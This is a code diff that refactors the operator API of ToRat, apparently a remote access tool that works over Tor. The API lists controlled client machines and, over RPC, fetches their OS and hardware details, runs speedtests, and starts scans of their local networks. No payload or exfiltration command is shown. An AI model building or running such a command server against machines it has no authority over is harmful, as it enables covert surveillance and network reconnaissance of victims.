@@ -1,28 +1,32 @@
 package server
 
 import (
-	"encoding/json"
 	"fmt"
 	"log"
-	"net/http"
 
-	"github.com/gorilla/mux"
+	"github.com/JustinTimperio/gomap"
+	"github.com/labstack/echo/v4"
 	"github.com/lu4p/ToRat/shared"
 )
 
 func APIServer() {
-	router := mux.NewRouter().StrictSlash(true)
+	e := echo.New()
 
-	router.HandleFunc("/clients", getClients).Methods("GET")
-	router.HandleFunc("/clients/{id}/osinfo", getClientOSInfo).Methods("GET")
-	router.HandleFunc("/clients/{id}/hardware", getClientHardware).Methods("GET")
-	router.HandleFunc("/clients/{id}/speedtest", getClientSpeedtest).Methods("GET")
-	router.HandleFunc("/clients/{id}/netscan", getClientNetscan).Methods("GET")
+	clients := e.Group("/clients")
+	clients.GET("", getClients)
+	clients.GET("/:id/osinfo", getClientOSInfo)
+	clients.GET("/:id/hardware", getClientHardware)
+	clients.GET("/:id/speedtest", getClientSpeedtest)
+	clients.GET("/:id/netscan", getClientNetscan)
 
-	log.Fatal(http.ListenAndServe(":8000", router))
+	fmt.Println("api routes:")
+	for _, route := range e.Routes() {
+		fmt.Println(route.Method, "http://localhost:8000"+route.Path)
+	}
+
+	log.Fatal(e.Start(":8000"))
 }
 
-// useful functions for stuff'n such
 func getClientIDs() []string {
 	var clients []string
 	for _, c := range activeClients {
@@ -37,82 +41,65 @@ func getActiveClientByID(id string) (*activeClient, error) {
 			return &c, nil
 		}
 	}
-	return nil, fmt.Errorf("No Client found with ID %s", id)
+	return nil, fmt.Errorf("no client found with ID %s", id)
 }
 
-// http REST functions
-func getClientHardware(w http.ResponseWriter, r *http.Request) {
-	var (
-		ac  *activeClient
-		err error
-	)
-	if ac, err = getActiveClientByID(mux.Vars(r)["id"]); err != nil {
-		w.WriteHeader(http.StatusNotFound)
-		fmt.Fprintf(w, err.Error())
-		return
+func getClientHardware(c echo.Context) error {
+	ac, err := getActiveClientByID(c.Param("id"))
+	if err != nil {
+		return err
 	}
+
 	hardware := shared.Hardware{}
-	if err = ac.RPC.Call("API.GetHardware", void, &hardware); err != nil {
-		w.WriteHeader(http.StatusNotFound)
-		fmt.Fprintf(w, "null")
-		return
+	if err := ac.RPC.Call("API.GetHardware", void, &hardware); err != nil {
+		return err
 	}
-	json.NewEncoder(w).Encode(hardware)
+
+	return c.JSON(200, &hardware)
 }
-func getClientOSInfo(w http.ResponseWriter, r *http.Request) {
-	var (
-		ac  *activeClient
-		err error
-	)
-	if ac, err = getActiveClientByID(mux.Vars(r)["id"]); err != nil {
-		w.WriteHeader(http.StatusNotFound)
-		fmt.Fprintf(w, err.Error())
-		return
+
+func getClientOSInfo(c echo.Context) error {
+	ac, err := getActiveClientByID(c.Param("id"))
+	if err != nil {
+		return err
 	}
+
 	osinfo := shared.OSInfo{}
-	if err = ac.RPC.Call("API.GetOSInfo", void, &osinfo); err != nil {
-		w.WriteHeader(http.StatusNotFound)
-		fmt.Fprintf(w, "null")
-		return
+	if err := ac.RPC.Call("API.GetOSInfo", void, &osinfo); err != nil {
+		return err
 	}
-	json.NewEncoder(w).Encode(osinfo)
+
+	return c.JSON(200, &osinfo)
 }
-func getClientSpeedtest(w http.ResponseWriter, r *http.Request) {
-	var (
-		ac  *activeClient
-		err error
-	)
-	if ac, err = getActiveClientByID(mux.Vars(r)["id"]); err != nil {
-		w.WriteHeader(http.StatusNotFound)
-		fmt.Fprintf(w, err.Error())
-		return
+
+func getClientSpeedtest(c echo.Context) error {
+	ac, err := getActiveClientByID(c.Param("id"))
+	if err != nil {
+		return err
 	}
+
 	speedtest := shared.Speedtest{}
-	if err = ac.RPC.Call("API.Speedtest", void, &speedtest); err != nil {
-		w.WriteHeader(http.StatusNotFound)
-		fmt.Fprintf(w, "null")
-		return
+	if err := ac.RPC.Call("API.Speedtest", void, &speedtest); err != nil {
+		return err
 	}
-	json.NewEncoder(w).Encode(speedtest)
+
+	return c.JSON(200, &speedtest)
 }
-func getClientNetscan(w http.ResponseWriter, r *http.Request) {
-	var (
-		ac  *activeClient
-		err error
-	)
-	if ac, err = getActiveClientByID(mux.Vars(r)["id"]); err != nil {
-		w.WriteHeader(http.StatusNotFound)
-		fmt.Fprintf(w, err.Error())
-		return
+
+func getClientNetscan(c echo.Context) error {
+	ac, err := getActiveClientByID(c.Param("id"))
+	if err != nil {
+		return err
 	}
-	gomap := shared.Gomap{}
-	if err = ac.RPC.Call("API.GomapLocal", void, &gomap); err != nil {
-		w.WriteHeader(http.StatusNotFound)
-		fmt.Fprintf(w, "null")
-		return
+
+	var network gomap.RangeScanResult
+	if err := ac.RPC.Call("API.GomapLocal", void, &network); err != nil {
+		return err
 	}
-	json.NewEncoder(w).Encode(gomap)
+
+	return c.JSON(200, network)
 }
-func getClients(w http.ResponseWriter, r *http.Request) {
-	json.NewEncoder(w).Encode(getClientIDs())
+
+func getClients(c echo.Context) error {
+	return c.JSON(200, getClientIDs())
 }
